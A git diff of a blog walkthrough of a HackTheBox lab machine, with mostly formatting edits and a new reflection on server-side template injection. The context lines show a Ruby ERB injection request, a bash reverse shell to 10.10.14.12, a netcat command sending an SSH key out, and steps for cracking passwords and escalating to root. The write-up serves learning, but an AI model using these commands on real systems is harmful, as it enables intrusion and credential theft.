@@ -25,7 +25,7 @@ output: html_document
 **Ports/services exploited:** 80/http\\
 **Tools:** Burpsuite, JtR, Hashcat, cewl, LinPeas\\
 **Techniques:** SSTI\\
-**Keywords:** Ruby, custom wordlist, SQLite
+**Keywords:** Ruby, custom wordlist, SQLite, ERB template
 
 **TL;DR**: the host is running a web server which presents an application written in Ruby. This latter is vulnerable to a server-side template injection (SSTI), and we are able to execute arbitrary code on the server. From there, we can get a reverse shell as susan, who turns out to be in the sudo group. The only thing required to escalate privileges to root is her password, and we find it hashed in a SQLite database. Finally, we find the password specifications in susan's mails. Hashcat can be used with a mask to crack the password. Once we have it, we can spawn a shell as root.
 
@@ -62,7 +62,7 @@ It is not shown in the image above, but the page indicates "Powered by WEBrick 1
 The formular accepts characters in the "Category" column, and integers in the "Grade" and "Weight (%)" columns. The weights must add up to 100. If those conditions are respected, the application returns the weighted grade. We can manually try a few characters like "(, {, <, ;, ',", and so on, to see how the applications reacts. I didn't find anything weird, so I opened up Burp to intercept the request and make the process of fuzzing the formular easier. Once the request is intercepted, we send it to the intruder to configure an attack:
 
 <div class="img_container">
-![burp]({{https://jsom1.github.io/}}/_images/htb_perf_burp1.png)
+![burp]({{https://jsom1.github.io/}}/_images/htb_perf_burp1.png){: height="200px" width = "500px"}
 </div>
 
 In the image above, we see the payload positions highlighted in green.
@@ -104,7 +104,8 @@ We see all the requests done by Burp, and the payloads used. We can analyze each
 ```
 curl -X POST -d "category1=%3C%25%20%60ls%60%20%25%3E&grade1=90&weight1=20&category2=Math&grade2=80&weight2=20&category3=English&grade3=85&weight3=20&category4=Science&grade4=70&weight4=20&category5=History&grade5=75&weight5=20" http://10.10.11.253/weighted-grade-calc
 ```
-It is a bit less convenient however. So, we must keep searching for the right payload. One place we can look at is <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby">HackTricks</a>. In the SSTI section, we see some payloads to test for an SSTI vulnerability in Ruby. Instead of using Burp's intruder, let's use the repeater. We modify the "category1" payload with the following ones:
+It is a bit less convenient however. So, we must keep searching for the right payload. One place we can look at is <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby" target="_blank">HackTricks</a>
+. In the SSTI section, we see some payloads to test for an SSTI vulnerability in Ruby. Instead of using Burp's intruder, let's use the repeater. We modify the "category1" payload with the following ones:
 
 ```
 {{7*7}} = {{7*7}}
@@ -137,7 +138,7 @@ For example, let's try to list the files with *ls*:
 ![burp ls]({{https://jsom1.github.io/}}/_images/htb_perf_burp9.png){: height="400px" width = "600px"}
 </div>
 
-If we can execute code, then we should be able to get a reverse shell. We can use <a href="https://www.revshells.com/">revshells</a> to get some reverse shells codes. After trying a few ones (python), I found out the following simple bash one works:
+If we can execute code, then we should be able to get a reverse shell. We can use <a href="https://www.revshells.com/" target="_blank">revshells</a> to get some reverse shells codes. After trying a few ones (python), I found out the following simple bash one works:
 
 ```
 bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
@@ -175,7 +176,7 @@ And this is it for the user flag. Now, we must find a way to escalate our privil
 ## 4. Vertical privilege escalation
 {:style="color:DarkRed; font-size: 170%;"}
 
-We see we're in as Susan. We can try the command *sudo -l*, but we need her password. Also, we get the message "sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper. sudo: a password is required". This is because the reverse shell we have isn't interactive, so it cannot ask for the password. We can upgrade this shell with the usual python command:
+We see we're in as Susan. We can try the command *sudo -l*, but we need her password. Also, we get the message "*sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper. sudo: a password is required*". This is because the reverse shell we have isn't interactive, so it cannot ask for the password. We can upgrade this shell with the usual python command:
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -191,7 +192,7 @@ cat ~/.ssh/id_rsa
 There's none. If we had found one, we could have transferred it on Kali with netcat (on Kali : _nc -lvnp 1234 > id_rsa_, in the reverse shell : _cat ~/.ssh/id_rsa | nc 10.10.14.12 1234_). Then we would have _chmod 600 id_rsa_, and finally use it to connect with SSH:  *ssh -i id_rsa susan@10.10.11.253*. If the key is protected by a passphrase, we could try to crack it with John the Ripper and the module ssh2john. We start by converting the key into a crackable format: *ssh2john id_rsa > id_rsa.hash*. Then, we crack it: *john id_rsa.hash --wordlist=/path/to/wordlist*.\\
 Anyway, let's try something else.
 
-1. System info
+**System info**
 
 We get info on the system to better understand the environment:
 
@@ -203,7 +204,7 @@ cat /etc/os-release
 
 Nothing stands out here.
 
-2. User information
+**User information**
 
 We check info on users and groups
 
@@ -215,8 +216,7 @@ cat /etc/group # nothing in particular
 ```
 I checked laurel's folder which contains two log files (audit.log and audit.log.1). Unfortunately, we don't have the permissions to read them.
 
-
-3. Info on running processes
+**Info on running processes**
 
 We're looking for interesting processes which would be executed by privileged users.
 
@@ -226,7 +226,7 @@ ps aux
 
 There's nothing in particular. We see the ruby application running locally (127.0.0.1) on port 3000, but that doesn't really help us.
 
-4. Info on cronjobs
+**Info on cronjobs**
 
 Some cronjobs can have scripts that are running with elevated privileges. If we can modify one of those script, it could be a way to escalate our privileges.
 
@@ -284,7 +284,7 @@ end
 
 Unfortunately, this cronjob runs with susan's permissions, so there is nothing we can do.
 
-7. Command history
+**Command history**
 
 Let's check susan's command history to see if we find anything interesting:
 
@@ -293,7 +293,7 @@ cat ~/.bash_history
 ```
 It's empty. There could be a symbolic link to /dev/null, so that the history is immediately thrown away. This is sometimes done for security reasons. It is also possible to configure bash so that it doesn't keep the history.
 
-6. Configuration files
+**Configuration files**
 
 We're looking for configuraitons files that could contain sensible information such as credentials.
 
@@ -443,6 +443,10 @@ We see that Susan can execute every command with sudo ((ALL : ALL) ALL). So, we 
 
 <ins>**My thoughts**</ins>
 
+This is the second time I came across a SSTI vulnerability (the first time was in <a href="/_walkthroughs/Forge">Forge</a>). This kind of vulnerability can arise by accident due to poor template design (people who are not familiar with the security implications). In this case, user input is concatenated and embedded into a template rather than being passed in as data.\\
+When this is the case, we can use native template syntax to place a payload server-side.
+
+Ces vulnérabilités surviennent lorsque les entrées utilisateur sont concaténées dans des modèles plutôt que passées comme données. Par exemple, un modèle statique avec des espaces réservés pour les données dynamiques est généralement sûr, mais si les entrées utilisateur sont directement intégrées dans le modèle avant le rendu, cela ouvre la porte aux attaques SSTI. Cela peut se produire par accident en raison d'une mauvaise conception des modèles ou intentionnellement, comme lorsque certains utilisateurs privilégiés sont autorisés à soumettre des modèles personnalisés, ce qui présente un risque de sécurité majeur si leurs comptes sont compromis.
 
 <ins>**Fix the vulnerabilities**</ins>
 
